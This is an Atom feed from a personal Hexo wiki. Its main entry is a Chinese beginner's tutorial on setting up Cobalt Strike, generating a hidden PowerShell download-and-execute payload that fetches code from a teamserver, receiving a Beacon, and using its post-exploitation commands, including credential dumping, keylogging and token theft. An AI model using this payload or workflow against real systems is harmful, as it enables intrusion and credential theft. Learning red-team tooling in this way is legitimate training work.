<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Tahir&#39;s Wiki</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-06-30T03:06:20.345Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Tahir</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>0-Cobalt Strike零基础</title>
    <link href="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/</id>
    <published>2021-06-28T11:59:00.000Z</published>
    <updated>2021-06-30T03:06:20.345Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="1-Cobalt-Strike-简介"><a href="#1-Cobalt-Strike-简介" class="headerlink" title="1.Cobalt Strike 简介"></a>1.Cobalt Strike 简介</h2><p>Cobalt Strike 是一款GUI的框架式渗透工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。</p><p>Cobalt Strike: C/S架构的商业渗透软件，适合多人进行团队协作，可模拟APT做模拟对抗，进行内网渗透。</p><p><strong>CS的发展</strong></p><ul><li><p>Armitage [2010-2012]</p><p>Armitage是一个红队协作攻击管理工具，它以图形化方式实现了Metasploit框架的自动化攻击。Armitage采用Java构建，拥有跨平台特性。</p></li><li><p>Cobalt Strike 1.x [2012-2014]</p><p>Cobalt Strike 增强了Metasploit Framework在执行目标攻击和渗透攻击的能力。</p></li><li><p>Cobalt Strike 2.x [2014-?]</p><p>Cobalt Strike 2是应模拟黑客攻击的市场需求而出现的，Cobalt Strike 2是以malleable C2技术的需求为定位的，这个技术使Cobalt Strike的能力更强了一些。</p></li><li><p>Cobalt Strike 3.x [2015-?]</p><p>Cobalt Strike 3 的攻击和防御都不用在Metasploit Framework平台（界面）下进行。</p><p>如今 Cobalt Strike 4.0 也已经发布，改动相比 3.x 还是不小的，笔者在演示的时候使用的 Cobalt Strike 4.0，看的视频教程是 3.x 的教程。</p></li></ul><p><strong>接下来会用到的工具和环境</strong></p><ul><li>Cobalt Strike</li><li>Kali</li><li>Metasploit Framework</li><li>PowerSploit</li><li>PowerTools</li><li>Veil Evasion Framework</li></ul><h2 id="2-Cobalt-Strike-安装"><a href="#2-Cobalt-Strike-安装" class="headerlink" title="2.Cobalt Strike 安装"></a>2.Cobalt Strike 安装</h2><h3 id="2-1-安装Java运行环境"><a href="#2-1-安装Java运行环境" class="headerlink" title="2.1 安装Java运行环境"></a>2.1 安装Java运行环境</h3><p>因为启动Cobalt Strike需要JDK的支持，所以需要安装Java环境。Java环境的安装可以参考：<a href="https://www.runoob.com/java/java-environment-setup.html">https://www.runoob.com/java/java-environment-setup.html</a></p><p>因为安装kali时，默认会安装java环境。我们可以通过java -version进行验证。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/1.png"></p><h3 id="2-2-部署TeamServer"><a href="#2-2-部署TeamServer" class="headerlink" title="2.2 部署TeamServer"></a>2.2 部署TeamServer</h3><p>在安装Cobalt Strike时，必须搭建团队服务器（TeamServer服务器）。打开cobaltstrike文件夹，赋予TeamServer 和 Cabalt Strike执行权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x teamserver cobaltstrike</span><br></pre></td></tr></table></figure><p>Cobalt Strike 文件夹中有多个文件和文件夹。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/2.png"></p><p>其功能如下。</p><ul><li>agscript：拓展应用的脚本。</li><li>c2lint：用于检查profile 的错误和异常。</li><li>teamserver：团队服务器程序。</li><li>cobaltstrike 和 cobaltstrike.jar:客户端程序。因为teamserver文件是通过Java来调用CobaltStrike 的，所以直接在命令行环境中输入第一个文件的内容也能启动Cobalt Strike 客户端 (主要是为了方便操作)。</li><li>logs:日志，包括 Web日志、Beacon日志、截图日志、下载日志、键盘记录日志等。</li><li>datas：用于保存当前TeamServer的一些数据。</li><li>update 和 update.jar：用于更新Cobalt Strike。</li></ul><p>最后，运行团队服务器。需要设置当前主机的IP地址和TeamServer的密码。输入如下命令启动TeamServer。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 10.251.0.35 sangfor</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/3.png"></p><p>Cobalt Strike的TeamServer准备就绪。接下来，我们就可以启动Cobalt Strike客户端来连接TeamServer了。</p><h2 id="3-Cobalt-Strike-启动"><a href="#3-Cobalt-Strike-启动" class="headerlink" title="3.Cobalt Strike 启动"></a>3.Cobalt Strike 启动</h2><h3 id="3-1-启动cobaltstrike-jar"><a href="#3-1-启动cobaltstrike-jar" class="headerlink" title="3.1 启动cobaltstrike.jar"></a>3.1 启动cobaltstrike.jar</h3><p>在Linux下，可以直接通过./cobaltstrike启动客户端，如下图。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cobaltstrike</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/4.png"></p><p>填写TeamServer的IP地址、端口号、用户名、密码。在这里，登录的用户名可以任意输名称，只要保证当前该用户名没有被用来登录Cobalt Strike服务器即可。</p><p>在确认信息填写无误后，点击Connect连接服务端，这时候会出现指纹校验对话框。指纹校验的主要作用是防篡改，且每次创建Cobalt Strike团队服务器时生成的指纹都不一样。</p><p>在客户端向服务器成功获取相关信息后，即可打开Cobalt Strike 主页面，Cobalt Strike 主页面主要分为菜单栏、快捷功能区、目标列表区、控制台命令输出区、控制台命令输入区。</p><ul><li>菜单栏：集成了Cobalt Strike的所有功能。</li><li>快捷功能区：列出常用的功能。</li><li>目标列表：根据不同的显示模式，显示已获取权限的主机及目标主机。</li><li>控制台命令输出区：输出命令的执行结果。</li><li>控制台命令输人区：输入命令。</li></ul><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/5.png"></p><p>Windows中，可以直接允许.bat程序，然后输入teamserver服务器的IP地址和密码进行连接即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/6.png"></p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/8.png"></p><h3 id="3-2-利用Cobalt-Strike-获取第一个Beacon"><a href="#3-2-利用Cobalt-Strike-获取第一个Beacon" class="headerlink" title="3.2 利用Cobalt Strike 获取第一个Beacon"></a>3.2 利用Cobalt Strike 获取第一个Beacon</h3><p><strong>建立Listener</strong></p><p>可以通过菜单栏的第一个选项”Cobalt Strike”进人”Listeners” 面板，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/9.png"></p><p>也可以通过快捷功能区进入”Listeners” 面板，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/10.png"></p><p>单击“Add” 按钮，新建一个监听器，输入名称、监听器类型、团队服务器IP地址、监听的端口，然后单击“Save”按钮保存设置。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/0.png"></p><p><strong>使用 Web Delivery 执行Payload</strong></p><p>单击 “Attacks” 菜单，选择”Web Drive-by”→”Scripted Web Delivery”选项，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/12.png"></p><p>或者通过快捷功能区，打开“Scripted Web Delivery”窗口，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/13.png"></p><p>保持默认配置，选择已经创建的监听器，设置类型为PowerShell,然后单击“Launch”按钮，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/14.png"></p><p>最后，将Cobalt Strike生成的Payload完整地复制下来，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/15.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.251.0.35:80/a&#x27;))&quot;</span><br></pre></td></tr></table></figure><p>其中url它是个文件路径，就是让目标 （受害者）通过这个地址和端口下载 恶意脚本。访问这个url，可以看到是一段powershell代码，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/16.png"></p><p><strong>在目标机器上执行Payload</strong></p><p>执行Payload，Cobalt Strike 会收到一个Beacon，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/17.png"></p><p>执行以后，可以在Cobalt Strike的日志里面看到一条日志，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/18.png"></p><p>在Cobalt Strike 的主页面中可以看到一台机器上线（包含外网IP地址，内网IP地址、监听器、用户名、机器名、是否有特权、Beacon进程的PID、心跳时间等信息），如下图:</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/19.png"></p><p><strong>与目标主机进行交互操作</strong></p><p>单击右键，在弹出的快捷菜单中选中需要操作的Beacon，然后单击”Interact”选项，进入主机交互模式，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/20.png"></p><p>现在就可以输入一些命令来执行相关操作了。输入”shell whoami”命令,查看当前用户，在心跳时间后就会执行该命令。在执行命令时，需要在命令前添加”shell”。Beacon的每次回连时间默认为60秒。如果sleep时间过长，在下载文件面前更为明显，所以在测试时会把时间降低一点 。拿到Beacon后，我一般先执行sleep 5，大家可以根据实战环境来调节，建议不要太快，不然流量会很明显。回连后，执行命令的任务将被下发，并成功回显命令的执行结果，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/21.png"></p><p>其他的Beacon命令，大家可以在Beacon中输入help来获取。在这贴出一部分汉化的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">Beacon Commands</span><br><span class="line"> Command Description</span><br><span class="line"> ------- -----------</span><br><span class="line"> browserpivot 注入受害者浏览器进程</span><br><span class="line"> bypassuac 绕过UAC</span><br><span class="line"> cancel 取消正在进行的下载</span><br><span class="line"> cd 切换目录</span><br><span class="line"> checkin 强制让被控端回连一次</span><br><span class="line"> clear 清除beacon内部的任务队列</span><br><span class="line"> connect Connect to a Beacon peer over TCP</span><br><span class="line"> covertvpn 部署Covert VPN客户端</span><br><span class="line"> cp 复制文件</span><br><span class="line"> dcsync 从DC中提取密码哈希</span><br><span class="line"> desktop 远程VNC</span><br><span class="line"> dllinject 反射DLL注入进程</span><br><span class="line"> dllload 使用LoadLibrary将DLL加载到进程中</span><br><span class="line"> download 下载文件</span><br><span class="line"> downloads 列出正在进行的文件下载</span><br><span class="line"> drives 列出目标盘符</span><br><span class="line"> elevate 尝试提权</span><br><span class="line"> execute 在目标上执行程序(无输出)</span><br><span class="line"> execute-assembly 在目标上内存中执行本地.NET程序</span><br><span class="line"> exit 退出beacon</span><br><span class="line"> getprivs Enable system privileges on current token</span><br><span class="line"> getsystem 尝试获取SYSTEM权限</span><br><span class="line"> getuid 获取用户ID</span><br><span class="line"> hashdump 转储密码哈希值</span><br><span class="line"> help 帮助</span><br><span class="line"> inject 在特定进程中生成会话</span><br><span class="line"> jobkill 杀死一个后台任务</span><br><span class="line"> jobs 列出后台任务</span><br><span class="line"> kerberos_ccache_use 从ccache文件中导入票据应用于此会话</span><br><span class="line"> kerberos_ticket_purge 清除当前会话的票据</span><br><span class="line"> kerberos_ticket_use 从ticket文件中导入票据应用于此会话</span><br><span class="line"> keylogger 键盘记录</span><br><span class="line"> kill 结束进程</span><br><span class="line"> link Connect to a Beacon peer over a named pipe</span><br><span class="line"> logonpasswords 使用mimikatz转储凭据和哈希值</span><br><span class="line"> ls 列出文件</span><br><span class="line"> make_token 创建令牌以传递凭据</span><br><span class="line"> mimikatz 运行mimikatz</span><br><span class="line"> mkdir 创建一个目录</span><br><span class="line"> mode dns 使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class="line"> mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class="line"> mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class="line"> mode http 使用HTTP作为通信通道</span><br><span class="line"> mv 移动文件</span><br><span class="line"> net net命令</span><br><span class="line"> note 备注 </span><br><span class="line"> portscan 进行端口扫描</span><br><span class="line"> powerpick 通过Unmanaged PowerShell执行命令</span><br><span class="line"> powershell 通过powershell.exe执行命令</span><br><span class="line"> powershell-import 导入powershell脚本</span><br><span class="line"> ppid Set parent PID for spawned post-ex jobs</span><br><span class="line"> ps 显示进程列表</span><br><span class="line"> p**ec Use a service to spawn a session on a host</span><br><span class="line"> p**ec_psh Use PowerShell to spawn a session on a host</span><br><span class="line"> psinject 在特定进程中执行PowerShell命令</span><br><span class="line"> pth 使用Mimikatz进行传递哈希</span><br><span class="line"> pwd 当前目录位置</span><br><span class="line"> reg Query the registry</span><br><span class="line"> rev2self 恢复原始令牌</span><br><span class="line"> rm 删除文件或文件夹</span><br><span class="line"> rportfwd 端口转发</span><br><span class="line"> run 在目标上执行程序(返回输出)</span><br><span class="line"> runas 以另一个用户权限执行程序</span><br><span class="line"> runasadmin 在高权限下执行程序</span><br><span class="line"> runu Execute a program under another PID</span><br><span class="line"> screenshot 屏幕截图</span><br><span class="line"> setenv 设置环境变量</span><br><span class="line"> shell cmd执行命令</span><br><span class="line"> shinject 将shellcode注入进程</span><br><span class="line"> shspawn 生成进程并将shellcode注入其中</span><br><span class="line"> sleep 设置睡眠延迟时间</span><br><span class="line"> socks 启动SOCKS4代理</span><br><span class="line"> socks stop 停止SOCKS4</span><br><span class="line"> spawn Spawn a session </span><br><span class="line"> spawnas Spawn a session as another user</span><br><span class="line"> spawnto Set executable to spawn processes into</span><br><span class="line"> spawnu Spawn a session under another PID</span><br><span class="line"> ssh 使用ssh连接远程主机</span><br><span class="line"> ssh-key 使用密钥连接远程主机</span><br><span class="line"> steal_token 从进程中窃取令牌</span><br><span class="line"> timestomp 将一个文件时间戳应用到另一个文件</span><br><span class="line"> unlink Disconnect from parent Beacon</span><br><span class="line"> upload 上传文件</span><br><span class="line"> wdigest 使用mimikatz转储明文凭据</span><br><span class="line"> winrm 使用WinRM在主机上生成会话</span><br><span class="line"> wmi 使用WMI在主机上生成会话</span><br><span class="line"> argue 进程参数欺骗</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;1-Cobalt-Strike-简介&quot;&gt;&lt;a href=&quot;#1-Cobalt-Strike-简介&quot; class=&quot;headerlink&quot; title=&quot;1.Cobalt Strike 简介&quot;&gt;&lt;/a&gt;1.Cobalt Strike 简介&lt;</summary>
      
    
    
    
    <category term="威胁猎捕" scheme="http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/"/>
    
    <category term="Cobalt Strike" scheme="http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt-Strike/"/>
    
    
    <category term="Cobalt Strike" scheme="http://example.com/tags/Cobalt-Strike/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/wiki/hello-world/"/>
    <id>http://example.com/wiki/hello-world/</id>
    <published>2021-06-28T11:10:07.606Z</published>
    <updated>1985-10-26T08:15:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
